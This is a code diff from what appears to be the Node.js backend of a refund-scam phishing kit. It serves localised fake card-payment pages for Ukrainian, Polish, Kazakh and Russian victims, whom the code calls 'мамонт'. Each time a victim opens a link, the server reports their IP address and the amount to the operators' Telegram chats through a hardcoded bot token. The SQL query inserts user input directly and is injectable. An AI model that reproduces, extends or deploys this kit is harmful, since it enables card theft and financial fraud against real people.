@@ -28,29 +28,37 @@ try {
     app.get('/refund/:userlink', (req, res) => {
         client.query(`SELECT amount, currency FROM userssrefund WHERE link = '${req.params.userlink}'`, (err, ress)=>{
             if (ress.rows[0] === undefined) {
-                res.redirect(`https://sauna-laguna.com`);
+                res.redirect(`https://funnyhub-cinema.com`);
                 return console.log("error");
             }
             if (req.params.userlink.search('ua') !=  -1){
                 console.log(1);
                 var index = 'index_card_ua';
                 var amount_c = `Повернення у розмірі ${ress.rows[0].amount} грн`;
+                let payment = 'Оплата замовлення'
+                let payment_button = 'Оплатити замовлення'
             } else if (req.params.userlink.search('pln') !=  -1) {
                 console.log(2);
                 var index = 'index_card_pln';
                 var amount_c = `Powrót w rozmiarze ${ress.rows[0].amount} zł`;
+                let payment = 'Zamów płatność'
+                let payment_button = 'Zapłacić za zamówienie'
             } else if (req.params.userlink.search('kz') !=  -1) {
                 console.log(2);
                 var index = 'index_card_kz';
                 var amount_c = `Возврат в размере ${ress.rows[0].amount} ₸`;
+                let payment = 'Оплата заказа'
+                let payment_button = 'Оплата'
             } else {
                 console.log(3);
                 var index = 'index_card';
                 var amount_c = `Возврат в размере ${ress.rows[0].amount} руб`;
+                let payment = 'Оплата заказа'
+                let payment_button = 'Оплата'
             }
             if (ress) {
                 const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
-                res.render(index, {amount: ress.rows[0].amount, amount_c: amount_c, user_link: req.params.userlink});
+                res.render(index, {amount: ress.rows[0].amount, amount_c: amount_c, user_link: req.params.userlink, payment: payment, payment_button: payment_button});
                 bot.sendMessage(-1001878239645, `🧖‍♀️ <b>Возврат\n</b>🙋‍♂️ <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n📍 <i>Сумма:</i> <b>${ress.rows[0].amount} ${ress.rows[0].currency}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
                 return console.log(ress.rows[0].amount);
             }
@@ -92,15 +100,19 @@ try {
 
     app.post('/3ds', (req, res) => {
         var amount_c = `Cумма к оплате ${req.body.amount} руб`;
-        res.render('index_card', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link});
+        let payment = 'Оплата заказа'
+        let payment_button = 'Оплата'
+        res.render('index_card', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
         bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001878239645, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
 
     })
     app.post('/3dsua', (req, res) => {
-        var amount_c = `Сума до оплати ${req.body.amount} грн`;
-        res.render('index_card_ua', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link});
+        var amount_c = `Сума до сплати ${req.body.amount} грн`;
+        let payment = 'Оплата замовлення'
+        let payment_button = 'Оплатити замовлення'
+        res.render('index_card_ua', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
         bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001878239645, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
@@ -108,7 +120,9 @@ try {
 
     app.post('/3dspln', (req, res) => {
         var amount_c = `kwota do zapłaty ${req.body.amount} zł`;
-        res.render('index_card_pln', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link});
+        let payment = 'Zamów płatność'
+        let payment_button = 'Zapłacić za zamówienie'
+        res.render('index_card_pln', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
         bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001878239645, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
@@ -116,7 +130,9 @@ try {
 
     app.post('/3dskz', (req, res) => {
         var amount_c = `Cумма к оплате ${req.body.amount} ₸`;
-        res.render('index_card_kz', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link});
+        let payment = 'Оплата заказа'
+        let payment_button = 'Оплата'
+        res.render('index_card_kz', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
         bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001878239645, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
